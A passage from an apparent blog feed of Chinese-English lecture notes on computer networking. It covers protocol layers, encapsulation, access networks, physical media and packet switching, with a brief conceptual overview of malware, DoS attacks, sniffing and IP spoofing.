style="text-align:center">帧frame</td></tr></tbody></table><ul><li>应用层：application：supporting network  applications<ul><li>网络应用程序和它们的应用层协议留存的地方</li><li>HTTP：提供web文档的请求和传送</li><li>SMTP：提供电子邮件报文的传输</li><li>FTP：提供两个端系统之间的文件传送</li><li>应用层协议分布在多个端系统上</li><li>一个端系统中的应用程序使用协议与另一个端系统中的应用程序交换信息的分组</li><li>位于应用层的信息分组称为<strong>报文（<em>message</em>）</strong>，this packet of information at the application  layer as a message（消息/报文）</li><li>always implemented in software in the end  systems</li></ul></li><li>运输层，transport：process-process data transfer<ul><li>运输层在应用程序端点之间传送应用层报文</li><li>协议：TCP、UDP，利用任意一个都能运输应用层报文<ul><li>TCP：<ul><li>向应用程序提供<strong>面向连接</strong>的服务，包括了<u>应用层报文向目的地的<strong>确保传递</strong></u>和<strong>流量控制</strong>（即发送方/接收方速率匹配）</li><li>将长报文划分为<strong>短报文</strong></li><li>并提供<strong>拥塞控制机制</strong>：当网络拥塞时，原抑制其传输速率</li></ul></li><li>UDP：<ul><li>向应用程序提供<strong>无连接服务</strong></li><li>一种不提供<strong>不必要服务</strong>的服务，没有可靠性、没有流量控制、没有拥塞控制</li></ul></li></ul></li><li>运输层分组称为<strong>报文段（<em>segment</em>）</strong></li></ul></li><li>网络层，network：routing of datagrams from source to destination<ul><li>负责将网络层分组从一台主机移动到另一台主机</li><li>often a mixed implementation of hardware  and software</li><li>分组名称：<strong>数据报（<em>datagram</em>）</strong></li><li>一台源主机中的因特网运输层协议（TCP或UDP）向网络层递交<strong>运输层报文段</strong>和<strong>目的地址</strong></li><li>协议：<ul><li>IP协议：<ul><li>定义了<strong>数据报</strong>中各个<strong>字段</strong></li><li>定义了<strong>端系统和路由器</strong>如何<strong>运用</strong>于这些字段</li></ul></li><li>路由选择协议<ul><li>决定路由</li><li>使数据报根据该路由从原传输到目的地</li></ul></li></ul></li></ul></li><li>链路层，link: data transfer between <strong>neighboring network elements</strong><ul><li>目的：将分组从一个结点（主机或路由器）移动到路径的下一个结点</li><li>typically implemented in a <strong>network interface网络接口</strong></li><li>优链路层提供的服务取决于应用于该链路的<strong>特定链路层协议</strong></li><li>协议：<ul><li>如以太网、WiFi和电缆接入网的DOCSIS协议， Ethernet, 802.11(Wi-Fi), PPP(点对点协议)</li><li>一个数据报可能被沿途不同链路上的不同链路层协议处理</li></ul></li><li>分组名称：<strong>帧（<em>frame</em>）</strong></li></ul></li><li>物理层<ul><li>链路层的任务：将<strong>整个帧</strong>从一个网络元素移动到邻近的网络元素</li><li>物理层的任务：将该帧中的<strong>一个一个比特</strong>从一个结点移动到下一个结点</li><li>typically implemented in a <strong>network interface</strong></li><li>协议：与链路相关，并且进一步与该链路的实际传输媒体相关</li></ul></li></ul></li><li><p>OSI模型</p><ul><li><p><strong>国际标准化组织（<em>ISO，International Organization for  Standardization</em>）<strong>提出计算机网络组织大约7层，称为</strong>开放系统互联（<em>OSI，Open System Interconnect</em>）模型</strong></p></li><li><p>七层ISO（少用）</p></li><li><p>表示层，presentation：</p><ul><li>使通信的应用程序能够解释交换数据的含义，allow  applications to interpret meaning of data</li><li>服务包括数据压缩compression、数据加密encryption、护具描述、machine-specific conventions（特定机器的约定）</li></ul></li><li><p>会话层，session：</p><ul><li>提供数据交换定界和同步功能，包括建立检查点和恢复方案的方法，synchronization,  check-pointing, recovery of data  exchange</li></ul></li><li><table><thead><tr><th style="text-align:center">应用层</th></tr></thead><tbody><tr><td style="text-align:center">表示层</td></tr><tr><td style="text-align:center">会话层</td></tr><tr><td style="text-align:center">运输层</td></tr><tr><td style="text-align:center">网络层</td></tr><tr><td style="text-align:center">链路层</td></tr><tr><td style="text-align:center">物理层</td></tr></tbody></table></li></ul></li></ul><h3 id="1-5-2封装（encapsulation）">1.5.2封装（<em>encapsulation</em>）</h3><img src="%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%912.assets/net1.24.jpg" alt="net1.24" style="zoom:67%;" /><ul><li>M：应用层报文（<em>application-layer message</em>）</li><li>M+H~t~（运输层首部信息）=运输层报文段（<em>transport-layer segment</em>）==》封装了应用层报文<ul><li>附加信息可能有<ul><li>运行接收端运输层向上向适当的应用程序<strong>交付报文</strong>的信息</li><li><strong>差错检测位信息</strong>：让<strong>接收方</strong>能够判断报文中的比特是否在途中已经改变</li></ul></li></ul></li><li>+H~n~（网络层首部信息）=网络层数据报（<em>network-layer datagram</em>）</li><li>=》链路层帧（<em>link-layer frame</em>）</li><li>每一层，一个分组有两种类型的字段：<strong>首部字段</strong>+<strong>有效载荷字段（<em>payload field</em>）</strong><ul><li>有效载荷通常来自上一层的分组</li></ul></li></ul><h1>1.6面对攻击的网络</h1><p>malware：恶意软件</p><p>botnet：僵尸网络</p><ul><li><p>malware(恶意软件) can get in host from:</p><ul><li>virus (病毒):<ul><li>self-replicating infection by  receiving/executing object (e.g., e-mail attachment)</li><li>一种需要某种形式的用户交互来感染用户设备的恶意软件</li></ul></li><li>worm (蠕虫):<ul><li>self-replicating infection by passively receiving object that gets itself executed (e.g. 系统漏洞)</li><li>一种无需任何明显用户交互就能进入设备的恶意软件</li></ul></li></ul></li><li><p>spyware malware(间谍类恶意软件) can record keystrokes (键盘敲击), web sites visited, upload info  to collection site</p></li><li><p>infected host can be enrolled in botnet (僵尸网络), used for spam. DDoS attacks</p></li><li><p>Denial of Service attack(DoS拒绝服务攻击) :</p><ul><li><p>attackers make resources  (server, bandwidth) unavailable to legitimate traffic (合法流量)  by overwhelming (淹没) resource with bogus traffic (伪造的流量)</p></li><li><p>1、select target</p><p>2、break into (入侵) hosts  around the network (see  botnet)</p><p>3、send packets to target from  compromised hosts 受害主机</p></li><li><p>类型</p><ul><li>弱点攻击<ul><li>向一台目标主机上运行的易受攻击的应用程序或操作系统发送制作精细的报文</li><li>如果适当顺序的多个分组发送给一个易受攻击的应用程序或操作系统，该服务器可能停止运行，甚至崩溃</li></ul></li><li>带宽洪泛<ul><li>向目标主机发送大量的分组，数量之多使得目标的<strong>接入链路</strong>变得拥塞，使合法的分组无法到达服务器</li></ul></li><li>连接洪泛<ul><li>在目标主机中创建大量的<strong>半开或全开TCP连接</strong>，该主机因为这些伪造的连接而陷入困境，并停止接收合法的连接</li></ul></li></ul></li></ul></li><li><p>分布式DoS（Distribute DoS，DDoS）</p><ul><li>攻击者控制多个源并让每个源向目标猛烈发送流量</li></ul></li><li><p>packet “sniffing嗅探” :</p><ul><li>broadcast media (shared ethernet, wireless)</li><li>promiscuous (混杂) network interface reads/records all packets (e.g., including passwords!) passing by</li><li>在无线传输设备的附近放置一台被动的接收机，该接收机就能得到传输的每个分组的副本</li><li>记录每个流经的分组的副本的被动接收机称为<strong>分组嗅探器（<em>packet sniffer</em>）</strong></li><li>嗅探器也能部署在有线环境中</li></ul></li><li><p>IP spoofing(IP欺骗): send packet with false source address</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第一章-计算机网络和因特网（一）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%911/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%911/</url>
    
    <content type="html"><![CDATA[<h1>1.1因特网</h1><h4 id="具体构成描述">具体构成描述</h4><ul><li><p>端系统通过<strong>通信链路</strong>(<em>communication links</em>)和<strong>分组交换机</strong>(<em>packet switch</em>)连接到一起</p></li><li><p>milions of connected computing devices：host=end system</p></li><li><p>many types of communication links made up of different types of <strong>physical media</strong> and <strong>radio spectrum</strong></p></li><li><p>物理媒体—&gt;通信链路(communication links):</p><ul><li><p>同轴电缆、铜线(copper)、光纤(fiber)、无线电频谱(radio spectrum)、satellite(卫星)</p></li><li><p>传输速率以<strong>比特/秒</strong>（bit/s,bps）来度量，transmission tate=bandwidth(带宽)</p></li></ul></li><li><p>分组交换机（packet switches）</p><ul><li><p>路由器、链路层交换机</p></li><li><p>朝着最终目的地转发分组，forward packets（chunks of data）</p></li><li><p>路由器(routers)：常用于<strong>网络核心</strong></p><p>链路层交换机(link-layer switches)：常用于<strong>接入网中</strong></p></li></ul></li><li><p>路径：一个分组所经历的通信链路+交换机</p></li><li><p>端系统通过<strong>因特网服务提供商</strong>接入因特网</p></li><li><p>ISP</p><ul><li>每个<strong>ISP</strong>是一个由多个<strong>分组交换机</strong>和<strong>多段通信链路</strong>组成的<strong>网络</strong></li></ul></li><li><p>为<strong>端系统</strong>提供不同类型的网络接入：</p><ul><li>线缆调制解调器<ul><li><p>（DLS？）住宅宽带接入</p></li><li><p>高速局域网接入</p></li><li><p>无线接入</p></li><li><p>56kbps拨号调制解调器接入</p></li></ul></li></ul></li><li><p>为<strong>内容提供者</strong>提供网络接入服务，将web站点直接接入因特网</p></li><li><p>端系统互联—&gt;ISP必须互联</p><ul><li><strong>低层ISP</strong>通过国家的、国际的高层ISP（Level 3 Communications、AT&amp;T、Sprint、NTT）互联</li></ul></li><li><p><strong>高层ISP</strong>通过<strong>高速光纤链路</strong>互联的<strong>高速路由器</strong>组成</p><ul><li>每个ISP独立管理，运行着IP协议</li></ul></li><li><p>因特网标准协议（<em>Internet standard</em>）由因特网工程任务组（<em>Internet Engineering Task Force，IETF</em>）研发</p></li><li><p>IETF的标准文档为<strong>请求评论</strong>（<em>Request For Comment，RFC</em>），定义了用于<strong>web</strong>的TCP、IP、HTTP和用于<strong>电子邮件</strong>的SMTP等协议</p></li></ul><h4 id="服务描述">服务描述</h4><p>描述角度：为<strong>应用程序</strong>提供<strong>服务</strong>的<strong>基础设施</strong></p><ul><li>应用程序（分布式应用程序，distributed application）：<ul><li>电子邮件、web冲浪、即使讯息、社交网络、因特网电视、IP语音（VoIP）、流式视频、分布式游戏、对等（peer-to-peer，P2P）、文件共享、因特网电视、远程注册等</li><li>分布式—&gt;涉及多台交换数据的端系统</li><li>运行在<strong>端系统</strong>上，不运行在网络核心中的<strong>分组交换机</strong>中</li></ul></li><li>communication infrastructure provided to apps<ul><li>connection-oriented reliable service（面向连接可靠服务）：reliable data  delivery from source to destination,  called <strong>Transmission Control Protocol  (TCP)</strong></li><li>connectionless unreliable service  ( 无连接不可靠服务): “best effort”  (unreliable) data delivery, called <strong>User  Datagram Protocol (UDP)</strong></li></ul></li><li>分组交换机：促进端系统之间的数据传输，不关心作为数据的源或宿的应用程序</li><li>应用程序接口（<em>Application Programming Interface，API</em>）：规定了运行在一个端系统上的<strong>软件</strong>请求<strong>因特网基础设施</strong>向运行在另一个端系统上的特定目的的<strong>软件交付数据的方式</strong><ul><li>Internet API is a set of rules  that the sending program must  follow</li><li>hooks that allow sending and receiving app programs to  “connect” to Internet</li><li>provides service options, similar  to postal service 类似邮局服务:</li><li>example: Alice send a letter to  Bob</li><li>a). follow the rule</li><li>b). provide more than one service</li></ul></li></ul><h4 id="协议">协议</h4><p>一个协议定义了在两个或多个<strong>通信实体</strong>之间交换的<strong>报文格式和次序</strong>，以及报文发送和/或接收一条报文或其他事件所采取的动作</p><p>protocols define format, order of msgs sent and received among network entities, and actions taken on msg transmission, receipt</p><ul><li><p>entities change: machines  rather than humans</p></li><li><p><strong>all communication activity</strong> in Internet governed by <strong>protocols</strong></p></li><li><p>主机：</p><ul><li>客户<em>client</em></li><li>服务器<em>server</em></li></ul></li><li><p>大部分提供搜索结果、电子邮件、web页面和视频的服务器都属于大型<strong>数据中心</strong>（<em>data center</em>）</p></li></ul><h1>网络边缘</h1><ul><li><p>network edge（网络边缘）</p><ul><li>hosts: clients and servers 客户端和服务器</li><li>servers often in data centers  (数据中心)</li></ul></li><li><p>access networks，physical  media (接入网络，物理介质):  wired，wireless communication links</p></li><li><p>network core(网络核心):</p><ul><li>interconnected routers</li><li>network of network</li></ul></li><li><p>end systems (hosts主机):</p><ul><li>at “edge of network”</li><li>run (host) application programs,  e.g. Web，email</li></ul></li><li><p>further divided client/server model ( 客户端 /服务器模型)</p><ul><li><p>client host requests, receives service  from always -on server</p></li><li><p>e.g. Web browser/server; email client/server</p></li><li><p>client: desktop PCs, PDAs, servers:  powerful machines (informally)</p></li></ul></li><li><p>peer -peer model (对等模型):</p></li><li><p>minimal (or no) use of dedicated  servers</p></li><li><p>e.g. Skype，PPTV，Thunder</p></li></ul><h3 id="接入网">接入网</h3><ul><li>接入网（<em>access network</em>）：将端系统连接到其<strong>边缘路由器</strong>（<em>edge router</em>）的<strong>物理链路</strong></li><li>边缘路由器：端系统到任何其他远程端系统的路径上的第一台路由器</li></ul><p>:one:家庭接入（住宅接入网络，residential access nets）：DSL、电缆、FTTH、拨号、卫星</p><p>🔹DSL（digital subscribe line，数字用户线路）</p><ul><li><p>住户通常从（提供本地电话接入的）本地电话公司处获得DSL因特网接入</p></li><li><p>当使用DSL时，本地电话公司就是它的ISP</p></li><li><p>每个用户的<strong>DSL调制解调器</strong>使用现有的<strong>电话线</strong>（双绞铜线）与位于本地电话公司的**本地中心局（<em>CO，central office</em>）<strong>中的</strong>数字用户线接入复用器（<em>DSLAM，DSL接入复用器</em>）**来交换数据</p></li><li><p>家庭的<strong>DSL调制解调器</strong>将得到的<strong>数据</strong>转换为<strong>高频音</strong>，以通过<strong>电话线</strong>传输给<strong>本地中心局</strong></p></li><li><p>来自多个家庭的<strong>模拟信号</strong>在<strong>DSLAM</strong>处转换回<strong>数字</strong>形式</p></li><li><p>家庭电话线同时承载了数据和传统的电话信号，编码为不同的频率：</p><ul><li><strong>高速下行信道</strong>，位于50kHz ~ 1MHz频段</li><li><strong>中速下行信道</strong>，位于4kHz ~ 50kHz频段</li><li>普通的<strong>双向电话信道</strong>，位于0kHz ~ 4kHz频段</li></ul></li><li><p>note：</p><p>:one:Home Access (1):digital subscriber line (DSL，数字用户线路)</p><ul><li><p>DSL Modem (DSL 调制解调器)：将<strong>数字信号</strong>调制到<strong>模拟载波信号</strong>上进行传输，并<strong>解调</strong>收到的<strong>模拟信号</strong>以得到<strong>数字信息</strong>的电子设备</p></li><li><p>Splitter (分离器)：separates <strong>data</strong> and <strong>telephone signals</strong> arriving to home and  <strong>forwards</strong> data signal to <strong>DSL modem</strong> (from CO to Home)</p></li><li><p>DSLAM (digital subscriber line access multiplexer，数字用户线路接入复用器)：</p><ul><li><strong>analog signals（模拟信号）</strong> from many houses are translated back into digital format at  the DSLAM</li><li><strong>separates</strong> the <strong>data</strong> and <strong>phone signals</strong> and <strong>sends</strong> the data into the Internet（from Home to CO)</li></ul></li><li><p>single DSL link <strong>appear three</strong> separate links</p></li><li><p>a telephone call and an Internet connection can share  the <strong>DSL link at the same time</strong></p></li><li><p>use existing telephone line to central office DSLAM</p><ul><li><p><strong>data</strong> over DSL phone line goes to <strong>Internet</strong></p></li><li><p><strong>voice</strong> over DSL phone line goes to <strong>telephone net</strong></p></li></ul></li><li><p>DSL classification</p><ul><li><p>**ADSL (<em>Asymmetric Digital Subscriber Line，非对称数字用户线</em>) **, typically upstream <strong>1Mbps</strong>， downstream <strong>8Mbps</strong></p></li><li><p><strong>HDSL（<em>High-speed Digital Subscriber Line,高速率数字用户线</em>）</strong>， upstream and downstream typically <strong>2Mbps</strong></p></li><li><p><strong>VDSL（<em>Very High Speed Digital Subscriber Line，超高速数字用户线</em>）</strong>, typically upstream <strong>19.2Mbps</strong>，downstream <strong>55Mbps</strong></p></li></ul></li></ul></li></ul><p>:small_blue_diamond:电缆因特网接入（<em>cacble Internet access</em>）</p><ul><li><p>混合光纤同轴（Hybrid Fiber Coax，HFC）网络</p></li><li><p>电缆因特网接入需要特殊的调制解调器——电缆调制解调器（<em>cable modem</em>）</p></li><li><p>电缆调制解调器通常是一个<strong>外部设备</strong>，通过一个<strong>以太网端口</strong>连接到家庭PC</p></li><li><p>在电缆头端，**电缆调制解调器系统（<em>Cable Modem Termination System</em>）**起到如同DSL网络的DSLAM类似的功能：（来自许多下行家庭中的电缆调制解调器发送的）模拟信号—&gt;数字信号</p></li><li><p>电缆因特网接入的重大特征：<strong>共享</strong>广播媒体</p><ul><li>若几个用户同时经下行信道下载一个视频文件，则每个用户接收视频文件的实际速率远低于电缆总计的下行速率</li><li>若很少的活跃用户进行web冲浪，则每个用户都可以以下行速率的全部速率接收web网页</li><li>共享—&gt;需要一个<strong>分布式多路访问协议</strong>来<strong>协调传输</strong>和<strong>避免碰撞</strong></li></ul></li></ul><p>note:</p><p>:two:Home Access (2):cable network  access (有线电视电缆网络接入)</p><p>​</p><ul><li><strong>DSL</strong> use <strong>existing telephone infrastructure</strong>，<strong>cable Internet access（有线互联网接入）</strong> use <strong>existing cable television infrastructure</strong></li><li><strong>frequency division multiplexing（频分多路复用）</strong>: different channels  transmitted in different frequency bands</li></ul><p>Home Access (2): cable network access (有线电视电缆网络接入)-HFC</p><p>​</p><ul><li>asymmetric (非对称): up to 30 Mbps downstream transmission rate，2  Mbps upstream transmission rate</li><li>network of cable, fiber attaches homes to ISP router<ul><li>homes <strong>share</strong> access network to cable headend，e.g. download video</li><li><strong>unlike DSL</strong> (has dedicated <strong>access</strong> to central office)</li><li>DSL and cable networks &gt;90% in USA</li></ul></li></ul><p>:small_blue_diamond:光纤到户（<em>Firber To The Home，FTTH</em>），Home Access (3)</p><ul><li>optical network terminator (ONT, 光网络终端，通常 称为“光猫”) similar to Modem</li><li>光纤分布体系结构（竞争性），optical-distribution network architectures：<ul><li>主动光纤网络（Active Optical Network，AON，有源光网络）</li><li>被动光纤网络（Passive Optical Network，PON，无源光网络）</li></ul></li><li>Each home has ONT (光猫)，users connect a home router to the ONT  to access Internet (国内大多是路由器和光猫的一体机)</li><li>OLT providing <strong>conversion</strong> between <strong>optical</strong> and <strong>electrical signals</strong></li><li><strong>Splitter combines</strong> a number of homes (typically &lt;100) onto a <strong>single,  shared</strong> optical fiber（光纤） (from home to OLT)</li><li>PON<ul><li>每个家庭有一个光纤网络端接服务器（Optical Network Terminator，ONT），由专门的光纤连接到邻近的分配器（splitter）</li><li>光纤线路端接器（Optical Line Terminator，OLT）提供光信号和电信号之间的转换，经本地电话公司的路由器与因特网相连</li><li>所有从OLT发送到splitter的分组在splitter（类似于一个电缆头端）处复制</li></ul></li></ul><table><thead><tr><th style="text-align:center">接入类型</th><th style="text-align:center">速率</th></tr></thead><tbody><tr><td style="text-align:center">DSL</td><td style="text-align:center">1-30Mbps</td></tr><tr><td style="text-align:center">cable Internet access</td><td style="text-align:center">30~50Mbps</td></tr><tr><td style="text-align:center">FTTH</td><td style="text-align:center">每秒千兆比特</td></tr><tr><td style="text-align:center">卫星</td><td style="text-align:center">1Mbps</td></tr><tr><td style="text-align:center">拨号</td><td style="text-align:center">56kbps</td></tr></tbody></table><p>typical home network</p><p>:two:企业（和家庭）接入：以太网和WiFi，institutional access networks (school,  company)（机构接入网络）</p><p>:small_blue_diamond: 以太网</p><ul><li><p>provides 100Mbps, 1Gbps, 10Gbps transmission rates</p></li><li><p>today, end systems typically connect Ethernet switch</p></li><li><p>在公司和大学校园以及很多家庭环境中，通常用局域网（<em>LAN，local area network</em>）将端用户连接到边缘路由器</p></li><li><p>在以上场景中最流行的接入技术：<strong>以太网</strong>（<em>Ethernet</em>）</p></li><li><p>以太网交换机或这样相连的交换机网络，再与更大的因特网相连</p></li><li><p>计入以太网交换机的速率：</p><ul><li>用户：100Mbps</li><li>服务器：1Gbps甚至10Gbps</li></ul></li></ul><p>:small_blue_diamond:WiFi（无线LAN的俗称）</p><ul><li><p>典型的家庭网络</p></li></ul><p>:small_blue_diamond:广域无线接入（WiMAX）：3G和LTE（<em>Long-Term Evolution</em>）</p><ul><li>iPhone、安卓等设备应用了与移动电话相同的基础设施，通过蜂窝网提供商运营的基站来发送和接收分组</li><li>一个用户仅需要位于基站的数万米范围内</li></ul><h6 id="note">note</h6><p>Wireless access  networks</p><ul><li>shared wireless access network connects end system to router<ul><li>via base station aka “access point”</li><li>used in universities, company, cafes, homes, airports…</li></ul></li><li>wireless LANs (无线局域网):<ul><li>within building (about 100 ft,约 30米)</li><li>802.11b/g/n/ac (WiFi): 11, 54,  600, 1300+ Mbps transmission  rate</li></ul></li><li>wide-area wireless access(广域无线接入网)</li><li>provided by telco (cellular) operator  蜂窝电话运营商 (10’s km)</li><li>between 1 and 100 Mbps</li><li>3G, 4G: TD-LTE(中国移动,下行和上行速率100Mbps和50Mbps)，FDD-LTE  (中国电信、联通,下行和上行速率 150Mbps和40Mbps),5G?10Gbps</li></ul><h3 id="物理媒体（physical-medium）">物理媒体（<em>physical medium</em>）</h3><table><thead><tr><th>技术</th><th>物理媒体</th></tr></thead><tbody><tr><td>HFC</td><td>光缆+同轴电缆</td></tr><tr><td>DSL</td><td>双绞铜线</td></tr><tr><td>以太网</td><td>双绞铜线</td></tr><tr><td>移动接入网</td><td>无线电频谱</td></tr></tbody></table><ul><li><p>分类</p><ul><li>引导型媒体（<em>guided media</em>）<ul><li>电波沿着<strong>固体媒体</strong>前行</li><li>光缆、双绞铜线、同轴电缆</li></ul></li><li>非引导型媒体（<em>unguided media</em>）<ul><li>电波在<strong>空气</strong>或<strong>外层空间</strong>中传播</li><li>无线局域网、数字卫星频道</li></ul></li></ul></li><li><p>双绞铜线</p><ul><li><p>最便宜、最普遍，常用于电话网，少用于电话线</p></li><li><p>一对电线构成一个通信链路</p></li><li><p>无屏蔽双绞线（<em>UTP，Unshielded Twisted Pair</em>）：</p><ul><li><p>常用在建筑物内的计算机网络中，即局域网（LAN）中</p></li><li><p>数据传输速率：10Mbps~10Gbps，取决于线的粗细、距离。The data rates can be achieved depend on  the thickness of the wire and the distance between transmitter and receiver</p></li></ul></li><li><p><strong>高速LAN</strong>联网的主要方式，也常用于住宅因特网接入</p></li><li><p>双绞线按屏蔽层有无可分为</p></li><li><p>UTP: Unshielded Twisted Pair (非屏蔽双绞线)</p></li><li><p>STP：Shielded Twisted-Pair （屏蔽双绞线），在芯线外增加铝箔层减少信号衰减</p></li><li><p>(2) 双绞线按照电气性能（频率、信噪比）可分为</p><ul><li>一类线（CAT1）：线缆最高频率带宽是750kHZ，用于报警系统，或只适用于语音传输（一类标准主要用于八十年代 初之前的电话线缆），不同于数据传输。</li><li>二类线（CAT2）：线缆最高频率带宽是1MHZ，用于语音传输和最高传输速率4Mbps的数据传输，常见于使用4Mbps规范令牌传递协议的旧的令牌网。</li><li>三类线（CAT3）：该电缆的传输频率16MHz，最高传输速率为10Mbps，主要应用于语音、10Mbit/s以太网 （10BASE-T）和4Mbit/s令牌环，最大网段长度为100m，采用RJ形式的连接器，目前已淡出市场（早期电话线）。</li><li>四类线（CAT4）：该类电缆的传输频率为20MHz，用于语音传输和最高传输速率16Mbps（指的是16Mbit/s令牌环）的数据传输，主要用于基于令牌的局域网和10BASE-T/100BASE-T。最大网段长为100m，采用RJ形式的连接器，未被广泛采用。</li><li>五类线（CAT5）：该类电缆增加了绕线密度，外套一种高质量的绝缘材料，线缆最高频率带宽为100MHz，最高传输率为100Mbps，用于语音传输和最高传输速率为100Mbps的数据传输，主要用于100BASE-T和1000BASE-T网络，最大网段长为100m，采用RJ形式的连接器。这是最常用的以太网电缆。</li><li>超五类线（CAT5e）：超5类具有衰减小，串扰少，并且具有更高的衰减与串扰的比值（ACR）和信噪比（Structural Return  Loss）、更小的时延误差，性能得到很大提高。超5类线主要用于千兆以太网（1000Mbps=1Gbps）。</li><li>六类线（CAT6）：该类电缆的为250MHz，六类布线系统在 200MHz时综合衰减串扰比（PS-ACR）应该有较大的余量，它提供2倍于超五类的带宽(2Gbps)。六类布线的传输性能远远高于超五类标准，最适用于传输速率高于1Gbps的应用。要求的布线距离为：永久链路的长度不能超过90m，信道长度不能超过100m。CAT6A标准的传输速率可达到10Gbps，使用在万兆以太网中。</li><li>七类线（CAT7）：传输频率为600MHz，可用于10Gbps(万兆)以太网。</li></ul><table><thead><tr><th>分类</th><th>线缆最高频率带宽</th><th>最高传输速率</th><th>最大网段长度</th><th>应用</th></tr></thead><tbody><tr><td>CAT1</td><td>750kHZ</td><td></td><td></td><td>报警系统，语音传输</td></tr><tr><td>CAT2</td><td>1MHZ</td><td></td><td></td><td>语音传输，数据传输(最高传输速率4Mbps)，用4Mbps规范令牌传递协议的旧的令牌网</td></tr><tr><td>CAT3</td><td>16MHz</td><td>10Mbps</td><td>100m</td><td>语音，10Mbit/s以太网，早期电话线</td></tr><tr><td>CAT4</td><td>20MHz</td><td></td><td>100m</td><td>语音传输，数据传输(最高传输速率16Mbps)</td></tr><tr><td>CAT5</td><td>100MHz</td><td>100Mbps</td><td>100m</td><td>最常用的以太网电缆</td></tr><tr><td>CAT5e</td><td></td><td></td><td></td><td>千兆以太网</td></tr><tr><td>CAT6</td><td>250MHz</td><td></td><td>永久链路的长度不能超过90m<br />信道长度不能超过100m</td><td>最适用于传输速率高于1Gbps的应用，万兆以太网</td></tr><tr><td>CAT7</td><td>600MHz</td><td></td><td></td><td>10Gbps(万兆)以太网</td></tr></tbody></table></li></ul></li><li><p>同轴电缆</p><ul><li>普遍用于电缆电视系统中</li><li>同轴电缆能被用作引导型共享媒体</li><li>许多端系统能够直接与该电缆相连，每个端系统都能接收由其他端系统发送的信息</li><li>bidirectional 双向, tens of Mbps  transmission rate（数十兆比特）</li><li>broadband宽频:<ul><li>multiple channels on cable</li><li>used in cable television systems,  HFC</li></ul></li></ul></li><li><p>光纤[fiber optic cable(光纤电缆）]</p><ul><li>引导光脉冲(light pulses)，每个脉冲表示一个比特</li><li>一根光纤能够支持极高的比特速率，高达数十甚至数百Gbps</li><li>high-speed operation: high-speed point-to-point  transmission (e.g., 10’s-100’s Gpbs transmission rate)</li><li>low error rate(低错误率):<ul><li>low signal attenuation(衰减) up to 100 km</li><li>repeaters (中继器) spaced far apart</li><li>immune to electromagnetic noise 不受电磁干扰</li></ul></li><li>不受电磁干扰、信号衰减极低、男窃听</li><li>长途引导型传输媒体，跨海链路</li></ul></li><li><p>radio (无线电)</p><ul><li><p>signal carried in  electromagnetic spectrum 电磁频谱</p></li><li><p>no physical “wire”</p></li><li><p>bidirectional 双向</p></li><li><p>propagation environment  effects:</p><ul><li>reflection 反射</li><li>obstruction by objects 障碍物</li><li>interference 干扰</li></ul></li><li><p>radio link types:</p><ul><li><p>陆地无线电信道</p><p>1、无线电信道承载<strong>电磁频谱</strong>中的信号</p><p>2、路径损耗、遮挡衰落、多径衰落（由于干扰对象的信号反射）、干扰（其他无线电信道、电磁信号）</p><p>3、无线LAN技术：局域无线电信道</p><p>4、short distance (e.g, Bluetooth)</p><p>5、local areas (e.g., WiFi)</p><p>6、wide-area (e.g., cellular)</p><p>蜂窝接入：广域无线电信道</p></li><li><p>卫星无线电信道（satellite radio channels）</p><p>同步卫星（<em>geostationary satellite</em>）</p><p>36000km</p><p>280ms信号传播时延近地轨道卫星（<em>LEO，Low-Earth Orbiting</em>）</p><p>hundreds of Mbps speed, but  about 280 ms end-end delay</p><p>often used in areas without  access to DSL or cable-based  Internet access</p><p>geosynchronous satellites  versus low-earth orbiting  satellites (地球同步卫星和低地球轨道卫星)</p></li></ul></li></ul></li></ul><h1>1.3网络核心(<em>The Network Core</em>)</h1><ul><li><p>网络核心：由<strong>互联因特网端系统</strong>的<strong>分组交换机</strong>和<strong>链路</strong>构成的<strong>网状网络</strong>，mesh of  interconnected routers and links that interconnects routers</p><ul><li>interconnected <strong>routers</strong></li><li>network of networks</li></ul></li><li><p>two fundamental approaches to  moving data: circuit switching（电路交换） and packet switching（包交换）</p><ul><li><p>circuit-switched networks: the  resources needed along a path for  communication between the end  systems are reserved</p></li><li><p>packet-switched networks: these  resources are not reserved; a session’s messages use the resources on demand</p></li></ul></li></ul><h5 id="1-3-1分组交换（包交换，packet-switching）">1.3.1分组交换（包交换，packet switching）</h5><ul><li><p>packet-switching: hosts break application-layer messages into packets (分组/数据包)</p><ul><li>forward packets from one  router to the next，across  links on path from source to  destination</li><li>each packet travels through communication links and packet switches (e.g.  routers，link-layer switches)</li><li>each packet transmitted at <strong>full link capacity</strong></li></ul></li><li><p>报文（<em>message</em>）：</p><ul><li>在各种网络应用中，端系统彼此交换报文</li><li>可以执行一种控制功能、包含数据</li><li>源将报文划分为较小的数据块——分组（<em>packet</em>）</li><li>每个分组都通过<strong>通信链路</strong>和<strong>分组交换机（<em>packet switch</em>）</strong>（交换机主要有两类：<strong>路由器</strong>和<strong>链路层交换机</strong>）传送</li><li>分组以等于该链路<strong>最大传输速率</strong>的速度传输通过通信链路</li><li>如果某源端系统或分组交换机经过一条链路发送一个<strong>L比特</strong>的分组，链路的传输速率为<strong>R比特/秒</strong>，则传输该分组的时间为<strong>L/R秒</strong></li></ul></li><li><p>存储转发传输（<em>store-and-forward transmission</em>）</p><ul><li><strong>分组交换机</strong>在链路的<strong>输入端</strong>使用<strong>存储转发传输</strong>机制</li><li>在交换机能够开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组</li><li>由N条速率均为R的链路组成的路径（所以，在源和目的地之间有N-1台路由器），端到端的时延：<strong>d=N（$$\frac{L}{R}$$）</strong></li><li>Most packet switches use store and-forward transmission</li></ul></li><li><p>排队时延和分组丢失</p><ul><li>每个分组交换机有多条链路与之相连</li><li>对于每条链路，该分组交换机有一个<strong>输出缓存（<em>output buffer</em>）</strong>（也称为<strong>输出队列（<em>output 